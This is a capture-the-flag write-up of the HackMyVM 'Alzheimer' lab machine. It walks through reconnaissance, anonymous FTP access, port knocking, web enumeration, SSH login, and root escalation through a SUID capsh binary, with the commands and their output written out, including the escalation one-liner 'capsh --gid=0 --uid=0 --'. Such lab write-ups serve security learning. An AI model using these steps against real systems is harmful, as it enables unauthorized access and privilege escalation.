# Alzheimer

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Alzheimer | sml | Beginner | HackMyVM |

**Summary:** Alzheimer is a beginner-level machine that demonstrates classic enumeration techniques and privilege escalation methods. The attack path involves network discovery, anonymous FTP access to obtain port knocking sequences, exploiting port knocking to reveal hidden web services, credential discovery through FTP file updates, SSH access, and finally privilege escalation via SUID-enabled capsh binary. The machine effectively teaches reconnaissance fundamentals, port knocking concepts, and Linux privilege escalation through SUID binaries.

---

## Reconnaissance

### Network Discovery
The initial reconnaissance began with network scanning to identify the target machine within the local network.

```bash
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.49 08:00:27:2A:D0:90 VirtualBox
```

The target machine was identified at IP address 192.168.100.49, running in a VirtualBox environment.

### Port Scanning
A comprehensive port scan was performed to identify open services and potential attack vectors.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/alzheimer]
└─$ nmap -sCV -p- 192.168.100.49
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-30 13:30 WIB
Nmap scan report for 192.168.100.49
Host is up (0.0051s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
21/tcp open     ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.100.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp filtered ssh
80/tcp filtered http
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.72 seconds
```

The scan revealed three significant findings:
- **Port 21/tcp**: FTP service (vsftpd 3.0.3) with anonymous login enabled
- **Port 22/tcp**: SSH service in filtered state
- **Port 80/tcp**: HTTP service in filtered state

### Initial Web Service Investigation
Attempts to access the HTTP service directly resulted in connection timeouts, indicating potential port filtering or additional security mechanisms.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ curl -I http://192.168.100.49
curl: (28) Failed to connect to 192.168.100.49 port 80 after 135301 ms: Could not connect to server
```

![image.png](image.png)

The browser confirmed the connection timeout, displaying an "ERR_CONNECTION_TIMED_OUT" error for 192.168.100.49.

---

## Initial Access

### FTP Enumeration
With anonymous FTP access confirmed, investigation began with the FTP service to gather intelligence.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/alzheimer]
└─$ ftp 192.168.100.49
Connected to 192.168.100.49.
220 (vsFTPd 3.0.3)
Name (192.168.100.49:ouba): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||20319|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        113          4096 Oct 03  2020 .
drwxr-xr-x    2 0        113          4096 Oct 03  2020 ..
-rw-r--r--    1 0        0              70 Oct 03  2020 .secretnote.txt
226 Directory send OK.
ftp> get .secretnote.txt
local: .secretnote.txt remote: .secretnote.txt
229 Entering Extended Passive Mode (|||24011|)
150 Opening BINARY mode data connection for .secretnote.txt (70 bytes).
100% |******************************|    70       17.60 KiB/s    00:00 ETA
226 Transfer complete.
70 bytes received in 00:00 (11.08 KiB/s)
ftp> bye
221 Goodbye.
```

### Secret Note Discovery
The `.secretnote.txt` file contained crucial information about a port knocking sequence:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/alzheimer]
└─$ cat .secretnote.txt
I need to knock this ports and
one door will be open!
1000
2000
3000
```

### Port Knocking Implementation
Based on the secret note, a port knocking sequence was implemented to potentially unlock filtered services.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/alzheimer]
└─$ for x in 1000 2000 3000; do nmap -Pn --max-retries 0 -p $x 192.168.100.49; done
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-30 13:41 WIB
Nmap scan report for 192.168.100.49
Host is up (0.00081s latency).

PORT     STATE  SERVICE
1000/tcp closed cadlock

Nmap done: 1 IP address (1 host up) scanned in 1.11 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-30 13:41 WIB
Nmap scan report for 192.168.100.49
Host is up (0.00073s latency).

PORT     STATE  SERVICE
2000/tcp closed cisco-sccp

Nmap done: 1 IP address (1 host up) scanned in 1.12 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-30 13:41 WIB
Nmap scan report for 192.168.100.49
Host is up (0.00077s latency).

PORT     STATE  SERVICE
3000/tcp closed ppp

Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds
```

### Web Service Access After Port Knocking
Following the port knocking sequence, the HTTP service became accessible:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ curl -I http://192.168.100.49
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Fri, 30 Jan 2026 06:41:15 GMT
Content-Type: text/html
Content-Length: 132
Last-Modified: Sat, 03 Oct 2020 09:55:08 GMT
Connection: keep-alive
ETag: "5f784a7c-84"
Accept-Ranges: bytes
```

### Web Content Analysis
The web service revealed important information about a user named "medusa" and contained a hidden morse code message:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ curl http://192.168.100.49
I dont remember where I stored my password :(
I only remember that was into a .txt file...
-medusa

<!---. --- - .... .. -. --. -->
```

The morse code `-. --- - .... .. -. --.` translates to "NOTHING", providing an additional clue.

### Directory Enumeration
Feroxbuster was used to discover hidden directories and files:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ feroxbuster -u http://192.168.100.49/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 10 -x txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.49/
 🚩  In-Scope Url          │ 192.168.100.49
 🚀  Threads               │ 10
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        5l       27w      132c http://192.168.100.49/
301      GET        7l       12w      185c http://192.168.100.49/home => http://192.168.100.49/home/
301      GET        7l       12w      185c http://192.168.100.49/admin => http://192.168.100.49/admin/
301      GET        7l       12w      185c http://192.168.100.49/secret => http://192.168.100.49/secret/
301      GET        7l       12w      185c http://192.168.100.49/secret/home => http://192.168.100.49/secret/home/
```

### Directory Content Investigation
Each discovered directory was investigated for additional information:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/alzheimer]
└─$ curl http://192.168.100.49/admin/
<html>
<head><title>403 Forbidden</title></head>
<body bgcolor="white">
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.14.2</center>
</body>
</html>

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/alzheimer]
└─$ curl http://192.168.100.49/home/
Maybe my pass is at home!
-medusa

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/alzheimer]
└─$ curl http://192.168.100.49/secret/
Maybe my password is in this secret folder?

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/alzheimer]
└─$ curl http://192.168.100.49/secret/home/
Im trying a lot. Im sure that i will recover my pass!
-medusa
```

### Credential Discovery Through FTP
Realizing that the port knocking mechanism might have updated the FTP content, a second FTP session was initiated:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/alzheimer]
└─$ ftp 192.168.100.49
Connected to 192.168.100.49.
220 (vsFTPd 3.0.3)
Name (192.168.100.49:ouba): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||25640|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        113          4096 Oct 03  2020 .
drwxr-xr-x    2 0        113          4096 Oct 03  2020 ..
-rw-r--r--    1 0        0             116 Jan 30 02:11 .secretnote.txt
226 Directory send OK.
ftp> get .secretnote.txt
local: .secretnote.txt remote: .secretnote.txt
229 Entering Extended Passive Mode (|||58358|)
150 Opening BINARY mode data connection for .secretnote.txt (116 bytes).
100% |************************************************************************************|   116       84.16 KiB/s    00:00 ETA
226 Transfer complete.
116 bytes received in 00:00 (39.29 KiB/s)
ftp> bye
221 Goodbye.
```

### Updated Secret Note
The updated `.secretnote.txt` file now contained additional credential information:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/alzheimer]
└─$ cat .secretnote.txt
I need to knock this ports and
one door will be open!
1000
2000
3000
Ihave[REDACTED]
Ihave[REDACTED]

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/alzheimer]
└─$ ls -la
total 48
drwxr-xr-x   2 ouba ouba  4096 Jan 30 14:17 .
drwxrwxrwt 114 root root 36864 Jan 30 14:39 ..
-rw-r--r--   1 ouba ouba    70 Oct  3  2020 .secretnote_old.txt
-rw-r--r--   1 ouba ouba   116 Jan 30 09:11 .secretnote.txt
```

The file size increased from 70 to 116 bytes, indicating new content had been dynamically added after the port knocking sequence.

### SSH Access
Using the discovered credentials, SSH access was successfully established:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/alzheimer]
└─$ ssh medusa@192.168.100.49
...
medusa@192.168.100.49's password:
Linux alzheimer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
...
medusa@alzheimer:~$ id
uid=1000(medusa) gid=1000(medusa) groups=1000(medusa),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
medusa@alzheimer:~$ ls -lahS
total 36K
drwxr-xr-x 3 medusa medusa 4.0K Jan 30 02:19 .
drwxr-xr-x 3 root   root   4.0K Oct  2  2020 ..
drwxr-xr-x 3 medusa medusa 4.0K Oct  3  2020 .local
-rw-r--r-- 1 medusa medusa 3.5K Oct  2  2020 .bashrc
-rw-r--r-- 1 medusa medusa  807 Oct  2  2020 .profile
-rw-r--r-- 1 medusa medusa  220 Oct  2  2020 .bash_logout
-rw------- 1 medusa medusa  107 Oct  3  2020 .Xauthority
-rw-r--r-- 1 medusa medusa   19 Oct  3  2020 user.txt
-rw------- 1 medusa medusa    8 Jan 30 02:19 .bash_history
```

The user flag named `user.txt` with absolute path `/home/medusa/user.txt`.

## Privilege Escalation

### Sudo Privileges Analysis
Initial enumeration revealed limited sudo privileges:

```bash
medusa@alzheimer:~$ sudo -l
Matching Defaults entries for medusa on alzheimer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User medusa may run the following commands on alzheimer:
    (ALL) NOPASSWD: /bin/id
```

The user could only execute `/bin/id` with sudo privileges, which provided limited escalation potential.

### SUID Binary Discovery
A comprehensive search for SUID binaries revealed an interesting target:

```bash
medusa@alzheimer:~$ find / -user root -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 157192 Feb  2  2020 /usr/bin/sudo
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rwsr-sr-x 1 root root 26776 Feb  6  2019 /usr/sbin/capsh
```

The most significant finding was `/usr/sbin/capsh` with SUID permissions, which is known to be exploitable.

### GTFOBins Research
Research using GTFOBins revealed the exploitation method for the capsh binary:

![image-1.png](image-1.png)

The GTFOBins page clearly showed that capsh can spawn an interactive system shell when executed with the SUID bit set, using the command: `capsh --gid=0 --uid=0 --`

### Root Privilege Escalation
The capsh SUID binary was successfully exploited to gain root privileges:

```bash
medusa@alzheimer:~$ /usr/sbin/capsh --gid=0 --uid=0 --
root@alzheimer:~# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(medusa)
```

### Root Flag
The root flag was successfully retrieved:

```bash
root@alzheimer:~# cd /root
root@alzheimer:/root# ls -lahS
total 24K
drwx------  3 root root 4.0K Oct  3  2020 .
drwxr-xr-x 18 root root 4.0K Oct  2  2020 ..
drwxr-xr-x  3 root root 4.0K Oct  2  2020 .local
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r-----  1 root root   16 Oct  3  2020 root.txt
root@alzheimer:/root# cat root.txt /home/medusa/user.txt
HMVl[REDACTED]
HMVr[REDACTED]
```

Both user and root flags were successfully captured, completing the machine compromise.

---

## Attack Chain Summary

1. **Reconnaissance**: Performed network discovery identifying target at 192.168.100.49, followed by port scanning revealing FTP (21/tcp) open and HTTP/SSH (80/tcp, 22/tcp) filtered
2. **FTP Intelligence Gathering**: Accessed anonymous FTP service and retrieved `.secretnote.txt` containing port knocking sequence (1000, 2000, 3000)
3. **Port Knocking Exploitation**: Executed port knocking sequence to unlock filtered HTTP service on port 80
4. **Web Enumeration**: Discovered web content revealing username "medusa" and performed directory enumeration finding /home/, /admin/, /secret/ directories
5. **Dynamic Credential Discovery**: Re-accessed FTP service post-knocking to retrieve updated `.secretnote.txt` containing SSH credentials
6. **Initial Access**: Used discovered credentials to establish SSH session as user medusa and retrieved user flag
7. **Privilege Escalation**: Identified SUID-enabled `/usr/sbin/capsh` binary through system enumeration
8. **Root Exploitation**: Leveraged capsh SUID binary using GTFOBins technique (`capsh --gid=0 --uid=0 --`) to escalate to root privileges and captured root flag